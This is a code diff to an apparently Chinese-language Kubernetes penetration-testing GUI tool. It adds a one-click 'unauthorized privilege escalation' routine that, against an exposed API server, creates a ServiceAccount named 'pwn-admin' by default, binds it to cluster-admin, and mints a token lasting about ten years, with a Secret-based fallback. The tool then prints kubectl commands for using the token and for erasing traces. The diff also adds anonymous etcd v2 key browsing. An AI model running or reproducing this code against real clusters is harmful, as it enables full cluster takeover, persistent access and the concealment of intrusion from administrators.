@@ -1,15 +1,17 @@
 package com.k8spen.tool.controller;
 
+import com.k8spen.tool.view.ResultPane;
 import com.google.gson.JsonArray;
 import com.google.gson.JsonObject;
 import com.google.gson.JsonParser;
 import com.k8spen.tool.utils.K8sHttpUtil;
-import com.k8spen.tool.utils.K8sJsonRenderer;
 import javafx.concurrent.Task;
 import javafx.scene.control.*;
 import javafx.stage.FileChooser;
 
 import java.io.File;
+import java.net.URLEncoder;
+import java.nio.charset.StandardCharsets;
 import java.nio.file.Files;
 import java.util.Base64;
 import java.util.regex.Matcher;
@@ -27,16 +29,18 @@ public class AccessHandler {
     private final TextField customApiPath;
     private final ComboBox<String> apiMethodOpt;
     private final TextArea kubectlCmdHint;
-    private final TextArea apiServerOutput;
+    private final ResultPane apiServerOutput;
+    private final TextField privEscNs, privEscSaName;
 
     // Kubelet
     private final TextField kubeletNs, kubeletPod, kubeletContainer, kubeletCmd;
-    private final TextArea kubeletOutput;
+    private final ResultPane kubeletOutput;
 
     // Etcd
     private final ComboBox<String> etcdVersionOpt;
     private final TextField etcdPort, etcdKeyInput;
-    private final TextArea etcdCmdHint, etcdOutput;
+    private final TextArea etcdCmdHint;
+    private final ResultPane etcdOutput;
 
     // Dashboard
     private final TextField dashboardPort;
@@ -52,12 +56,13 @@ public class AccessHandler {
 
     public AccessHandler(ControllerContext ctx,
                          TextField customApiPath, ComboBox<String> apiMethodOpt,
-                         TextArea kubectlCmdHint, TextArea apiServerOutput,
+                         TextArea kubectlCmdHint, ResultPane apiServerOutput,
+                         TextField privEscNs, TextField privEscSaName,
                          TextField kubeletNs, TextField kubeletPod,
                          TextField kubeletContainer, TextField kubeletCmd,
-                         TextArea kubeletOutput,
+                         ResultPane kubeletOutput,
                          ComboBox<String> etcdVersionOpt, TextField etcdPort,
-                         TextField etcdKeyInput, TextArea etcdCmdHint, TextArea etcdOutput,
+                         TextField etcdKeyInput, TextArea etcdCmdHint, ResultPane etcdOutput,
                          TextField dashboardPort, CheckBox dashboardHttps, TextArea dashboardOutput,
                          TextArea kubeconfigContent, TextArea kubeconfigOutput,
                          TabPane mainTabPane,
@@ -65,6 +70,7 @@ public class AccessHandler {
         this.ctx = ctx;
         this.customApiPath = customApiPath; this.apiMethodOpt = apiMethodOpt;
         this.kubectlCmdHint = kubectlCmdHint; this.apiServerOutput = apiServerOutput;
+        this.privEscNs = privEscNs; this.privEscSaName = privEscSaName;
         this.kubeletNs = kubeletNs; this.kubeletPod = kubeletPod;
         this.kubeletContainer = kubeletContainer; this.kubeletCmd = kubeletCmd;
         this.kubeletOutput = kubeletOutput;
@@ -75,6 +81,7 @@ public class AccessHandler {
         this.kubeconfigContent = kubeconfigContent; this.kubeconfigOutput = kubeconfigOutput;
         this.mainTabPane = mainTabPane;
         this.defaultSshPubKey = defaultSshPubKey; this.defaultSshPrivKey = defaultSshPrivKey;
+        etcdOutput.setEtcdDirectoryOpenAction(this::etcdBrowseDirectory);
     }
 
     public String getApiBaseUrl() { return apiBaseUrl; }
@@ -95,13 +102,14 @@ public class AccessHandler {
     }
 
     public void checkSecurePort() {
-        String host = ctx.getHost(); if (host == null) return;
-        apiBaseUrl = "https://" + host + ":6443";
+        String base = ctx.getApiBaseUrl(); if (base == null) return;
+        apiBaseUrl = base;
         ctx.log("[*] 已切换到安全端口: " + apiBaseUrl);
         String url = apiBaseUrl + "/";
+        boolean tls = "https".equals(ctx.getProtocol());
         String hint = "# 当前使用: " + apiBaseUrl + "\n"
                 + "# 等效kubectl命令:\n"
-                + "kubectl -s https://" + host + ":6443 --insecure-skip-tls-verify=true get nodes\n"
+                + "kubectl -s " + apiBaseUrl + (tls ? " --insecure-skip-tls-verify=true" : "") + " get nodes\n"
                 + "# 如果返回API列表而非403，说明存在匿名访问未授权";
         ctx.asyncGet(url, apiServerOutput, hint, kubectlCmdHint);
     }
@@ -134,6 +142,127 @@ public class AccessHandler {
         ctx.asyncPost(url, body, "application/json", apiServerOutput);
     }
 
+    // ================ 未授权提权: 一键生成高权限Token ================
+
+    public void mintAdminToken() {
+        String base = ctx.getApiBaseUrl(); if (base == null) return;
+        String ns = privEscNs.getText().trim(); if (ns.isEmpty()) ns = "default";
+        String sa = privEscSaName.getText().trim(); if (sa.isEmpty()) sa = "pwn-admin";
+        String fBase = base; String fNs = ns; String fSa = sa;
+        ctx.setStatus("正在生成高权限Token...");
+        apiServerOutput.setText("请求中...\n");
+        ctx.log("[*] 提权流程: 创建SA -> 绑定cluster-admin -> 获取Token (" + fBase + ")");
+
+        Task<String> task = new Task<>() {
+            @Override protected String call() throws Exception {
+                StringBuilder out = new StringBuilder();
+                String token = ctx.getToken();
+
+                // 1. 创建 ServiceAccount
+                String saBody = "{\"apiVersion\":\"v1\",\"kind\":\"ServiceAccount\",\"metadata\":{\"name\":\"" + fSa + "\",\"namespace\":\"" + fNs + "\"}}";
+                String r1 = K8sHttpUtil.sendPost(fBase + "/api/v1/namespaces/" + fNs + "/serviceaccounts", saBody, "application/json", token, ctx.getTimeout());
+                if (!isOk(r1)) return out.append("[-] 创建ServiceAccount失败:\n").append(r1).toString();
+                out.append("[+] ServiceAccount已就绪: ").append(fNs).append("/").append(fSa).append("\n");
+
+                // 2. 绑定 cluster-admin
+                String crbBody = "{\"apiVersion\":\"rbac.authorization.k8s.io/v1\",\"kind\":\"ClusterRoleBinding\","
+                        + "\"metadata\":{\"name\":\"" + fSa + "-binding\"},"
+                        + "\"roleRef\":{\"apiGroup\":\"rbac.authorization.k8s.io\",\"kind\":\"ClusterRole\",\"name\":\"cluster-admin\"},"
+                        + "\"subjects\":[{\"kind\":\"ServiceAccount\",\"name\":\"" + fSa + "\",\"namespace\":\"" + fNs + "\"}]}";
+                String r2 = K8sHttpUtil.sendPost(fBase + "/apis/rbac.authorization.k8s.io/v1/clusterrolebindings", crbBody, "application/json", token, ctx.getTimeout());
+                if (!isOk(r2)) return out.append("[-] 绑定cluster-admin失败:\n").append(r2).toString();
+                out.append("[+] 已绑定cluster-admin: ").append(fSa).append("-binding\n");
+
+                // 3. TokenRequest API 取 Token
+                String trBody = "{\"apiVersion\":\"authentication.k8s.io/v1\",\"kind\":\"TokenRequest\","
+                        + "\"spec\":{\"audiences\":[\"https://kubernetes.default.svc\"],\"expirationSeconds\":315360000}}";
+                String r3 = K8sHttpUtil.sendPost(fBase + "/api/v1/namespaces/" + fNs + "/serviceaccounts/" + fSa + "/token", trBody, "application/json", token, ctx.getTimeout());
+                String saToken = null;
+                if (isOk(r3)) {
+                    try {
+                        saToken = JsonParser.parseString(stripHttpPrefix(r3)).getAsJsonObject()
+                                .getAsJsonObject("status").get("token").getAsString();
+                    } catch (Exception ignored) {}
+                }
+                if (saToken != null) {
+                    out.append("[+] TokenRequest获取Token成功\n");
+                } else {
+                    // 4. 降级路径: 创建SA token类型Secret, 轮询读取
+                    out.append("[*] TokenRequest失败, 降级为Secret方式...\n");
+                    String secName = fSa + "-token";
+                    String secBody = "{\"apiVersion\":\"v1\",\"kind\":\"Secret\",\"metadata\":{\"name\":\"" + secName
+                            + "\",\"namespace\":\"" + fNs + "\",\"annotations\":{\"kubernetes.io/service-account.name\":\"" + fSa
+                            + "\"}},\"type\":\"kubernetes.io/service-account-token\"}";
+                    String r4 = K8sHttpUtil.sendPost(fBase + "/api/v1/namespaces/" + fNs + "/secrets", secBody, "application/json", token, ctx.getTimeout());
+                    if (!isOk(r4)) return out.append("[-] 创建Token Secret失败:\n").append(r4).toString();
+                    for (int i = 0; i < 5 && saToken == null; i++) {
+                        Thread.sleep(1000);
+                        String r5 = K8sHttpUtil.sendRequest(fBase + "/api/v1/namespaces/" + fNs + "/secrets/" + secName, "GET", token, ctx.getTimeout());
+                        if (isOk(r5)) {
+                            try {
+                                String b64 = JsonParser.parseString(stripHttpPrefix(r5)).getAsJsonObject()
+                                        .getAsJsonObject("data").get("token").getAsString();
+                                saToken = new String(Base64.getDecoder().decode(b64));
+                            } catch (Exception ignored) {}
+                        }
+                    }
+                    if (saToken == null) return out.append("[-] 轮询Secret超时, 未获取到Token\n").toString();
+                    out.append("[+] 通过Secret获取Token成功\n");
+                }
+
+                boolean tls = "https".equals(ctx.getProtocol());
+                out.append("\n# ===== cluster-admin Token =====\n").append(saToken).append("\n\n");
+                out.append("# 使用方法:\nkubectl --server=").append(fBase).append(" --token=").append(saToken)
+                        .append(tls ? " --insecure-skip-tls-verify=true" : "").append(" get pods --all-namespaces\n\n");
+                out.append("# 清理痕迹:\nkubectl --server=").append(fBase).append(" --token=<token> delete clusterrolebinding ").append(fSa).append("-binding\n")
+                        .append("kubectl --server=").append(fBase).append(" --token=<token> delete sa ").append(fSa).append(" -n ").append(fNs).append("\n");
+                return out.toString();
+            }
+        };
+        task.setOnSucceeded(e -> {
+            String result = task.getValue();
+            apiServerOutput.setText(result);
+            int idx = result.indexOf("# ===== cluster-admin Token =====\n");
+            if (idx >= 0) {
+                int start = idx + "# ===== cluster-admin Token =====\n".length();
+                int end = result.indexOf('\n', start);
+                if (end > start) {
+                    ctx.getTokenField().setText(result.substring(start, end).trim());
+                    ctx.log("[+] 高权限Token已自动回填到Token输入框");
+                }
+                ctx.setStatus("高权限Token生成成功");
+                ctx.log("[+] 高权限Token生成成功: " + fNs + "/" + fSa);
+            } else {
+                ctx.setStatus("高权限Token生成失败");
+                ctx.log("[-] 高权限Token生成失败, 详见输出区");
+            }
+        });
+        task.setOnFailed(e -> {
+            apiServerOutput.setText("[-] 请求失败: " + task.getException().getMessage());
+            ctx.setStatus("请求失败");
+            ctx.log("[-] 提权请求失败: " + task.getException().getMessage());
+        });
+        new Thread(task).start();
+    }
+
+    // [HTTP code] 前缀解析: 200/201/409(AlreadyExists) 视为成功
+    private boolean isOk(String resp) {
+        if (resp == null) return false;
+        if (!resp.startsWith("[HTTP ")) return true;
+        try {
+            int code = Integer.parseInt(resp.substring(6, resp.indexOf(']')).trim());
+            return code == 200 || code == 201 || code == 409;
+        } catch (Exception e) { return false; }
+    }
+
+    private String stripHttpPrefix(String resp) {
+        if (resp != null && resp.startsWith("[HTTP")) {
+            int nl = resp.indexOf('\n');
+            if (nl > 0) return resp.substring(nl + 1).trim();
+        }
+        return resp;
+    }
+
     public void sendCustomApi() {
         String host = ctx.getHost(); if (host == null) return;
         String path = customApiPath.getText().trim();
@@ -153,7 +282,7 @@ public class AccessHandler {
                 }
             };
             task.setOnSucceeded(e -> {
-                apiServerOutput.setText(K8sJsonRenderer.render(task.getValue()));
+                ctx.showHttpResponse(apiServerOutput, task.getValue());
                 ctx.setStatus("请求完成");
             });
             task.setOnFailed(e -> apiServerOutput.setText("[-] 请求失败: " + task.getException().getMessage()));
@@ -165,7 +294,8 @@ public class AccessHandler {
 
     private String buildApiUrl(String host, String path) {
         if (apiBaseUrl != null && !apiBaseUrl.isEmpty()) return apiBaseUrl + path;
-        return "https://" + host + ":6443" + path;
+        String base = ctx.getApiBaseUrl();
+        return base != null ? base + path : null;
     }
 
     // ================ Kubelet ================
@@ -269,6 +399,23 @@ public class AccessHandler {
         return p.isEmpty() ? "2379" : p;
     }
 
+    private String etcdV2Url(String host, String port, String key) {
+        String path = key.startsWith("/") ? key : "/" + key;
+        return "http://" + host + ":" + port + "/v2/keys"
+                + URLEncoder.encode(path, StandardCharsets.UTF_8).replace("%2F", "/").replace("+", "%20");
+    }
+
+    private void etcdBrowseDirectory(String key) {
+        if (!"v2".equals(etcdVersionOpt.getValue())) {
+            ctx.log("[-] 请切换到 etcd v2 后重新获取目录");
+            return;
+        }
+        String host = ctx.getHost(); if (host == null) return;
+        etcdKeyInput.setText(key);
+        String url = etcdV2Url(host, getEtcdPort(), key);
+        ctx.asyncGet(url, etcdOutput, "# 浏览 etcd v2 目录:\ncurl '" + url + "'", etcdCmdHint);
+    }
+
     public void checkEtcd() {
         String host = ctx.getHost(); if (host == null) return;
         String ep = getEtcdPort(); String version = etcdVersionOpt.getValue();
@@ -313,7 +460,7 @@ public class AccessHandler {
         if (key.isEmpty()) { etcdOutput.setText("[-] 请输入要读取的Key"); return; }
         String version = etcdVersionOpt.getValue();
         if ("v2".equals(version)) {
-            ctx.asyncGet("http://" + host + ":" + ep + "/v2/keys" + (key.startsWith("/") ? key : "/" + key), etcdOutput);
+            ctx.asyncGet(etcdV2Url(host, ep, key), etcdOutput);
         } else {
             ctx.asyncPost("http://" + host + ":" + ep + "/v3/kv/range", "{\"key\":\"" + Base64.getEncoder().encodeToString(key.getBytes()) + "\"}", "application/json", etcdOutput);
         }
